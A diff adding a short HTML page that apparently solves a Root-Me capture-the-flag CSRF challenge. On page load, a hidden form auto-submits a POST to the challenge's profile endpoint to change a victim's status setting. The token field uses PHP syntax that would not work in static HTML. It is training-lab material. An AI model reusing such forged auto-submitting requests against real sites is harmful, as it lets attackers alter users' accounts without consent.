@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html>
+<body onload="document.getElementById('myForm').submit();">
+
+		<form id="myForm" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
+		<div>
+			<label>Username:</label>
+			<input id="username" type="text" name="username" value="prova">
+			</div>
+			<br>		
+			<div>
+			<label>Status:</label>
+			<input id="status" type="checkbox" name="status" checked>
+			</div>
+			<br>
+			<input id="token" type="hidden" name="token" value=$_POST["token"]>
+			<button type="submit">Submit</button>
+			</form>
+</body>
+</html>
